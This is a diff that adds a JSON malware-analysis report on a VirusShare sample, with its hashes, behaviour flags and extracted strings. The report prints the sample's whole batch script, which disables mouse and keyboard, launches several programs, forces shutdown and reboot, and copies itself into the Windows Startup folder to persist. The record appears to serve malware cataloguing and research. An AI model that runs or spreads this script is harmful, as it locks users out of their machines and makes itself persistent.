@@ -1,0 +1,49 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "shell32": "May run an executable file or a system command",
+            "windows": "May enumerate application windows"
+        },
+        "macro": ":\\windows\\rundll.exe mouse,disable\nc:\\windows\\rundll.exe keyboard,disable\nstart sol.exe\nstart mspaint.exe\nstart wordpad.exe\nstart notepad.exe\ncls\nSHUTDOWN -s -t 2 -c\nTYPE NUL | CHOICE.COM /N/CY/TY,3 >NUL\ncopy %0 c:\\windows\\startm~1\\programs\\startup \nstart rundll.exe shell32.dll,SHExitWindowsEx 2\n"
+    },
+    "filename": "VirusShare_d79ede795c626d787c62458469dd1336",
+    "filesize": 310,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "d79ede795c626d787c62458469dd1336",
+        "sha1": "da6d4991bb257a6e714776a9ab822bfb149dc615",
+        "sha256": "5236c09cad6064ab785553142a216c80755d10451b56283a60dae8b9e9fb5f27"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            ":\\windows\\rundll.exe mouse,disable",
+            "c:\\windows\\rundll.exe keyboard,disable",
+            "start sol.exe",
+            "start mspaint.exe",
+            "start wordpad.exe",
+            "start notepad.exe",
+            "SHUTDOWN -s -t 2 -c",
+            "TYPE NUL | CHOICE.COM /N/CY/TY,3 >NUL",
+            "copy %0 c:\\windows\\startm~1\\programs\\startup ",
+            "start rundll.exe shell32.dll,SHExitWindowsEx 2"
+        ],
+        "file": {
+            "start mspaint.exe": "Executable",
+            "start notepad.exe": "Executable",
+            "start sol.exe": "Executable",
+            "start wordpad.exe": "Executable"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.260787",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
